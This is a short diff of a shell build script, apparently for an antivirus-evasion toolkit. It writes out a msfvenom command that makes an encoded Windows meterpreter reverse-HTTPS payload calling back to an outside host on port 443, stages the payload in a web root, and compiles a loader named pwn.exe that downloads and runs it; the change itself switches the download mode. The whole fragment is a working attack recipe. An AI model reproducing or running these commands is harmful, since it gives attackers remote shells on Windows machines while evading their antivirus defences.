@@ -8,7 +8,7 @@
 # create payload in /var/www/html
 msfvenom -p windows/meterpreter/reverse_https lhost=192.168.2.103 lport=443 -e x86/shikata_ga_nai -b '\x00' -i 3 -f raw -a x86 --platform Windows > /var/www/html/sc.bin
 # config for downloading and exec shellcode
-./make_avet -d
+./make_avet -d sock
 # compile to pwn.exe file
 $win32_compiler -o pwn.exe avet.c -lwsock32 -lWs2_32
 # cleanup
